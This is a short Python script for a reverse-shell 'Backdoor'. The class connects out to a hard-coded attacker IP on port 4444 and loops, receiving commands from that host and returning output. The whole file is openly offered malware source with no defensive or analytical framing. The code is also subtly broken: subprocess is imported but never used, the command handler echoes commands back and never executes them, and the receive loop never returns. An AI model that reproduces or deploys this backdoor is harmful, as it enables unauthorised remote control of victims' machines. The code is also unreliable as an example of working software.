import json
import socket
import subprocess

class Backdoor:
    
    def __init__(self, attacker_ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((attacker_ip, port))

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, 'utf-8'))

    def receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
            except ValueError as e:
                print(f"Error receiving data: {e}")
                continue

    def execute_system_command(self, command):
        self.send(command)
        return self.receive()

    def run(self):
        while True:
            command = self.connection.recv(1024).decode('utf-8')
            
            if command.lower() == 'exit':
                break
            
            result = self.execute_system_command(command)
            self.connection.send(result)

        self.connection.close()

attacker_ip = "192.168.106.129"
bd = Backdoor(attacker_ip, 4444)
bd.run()
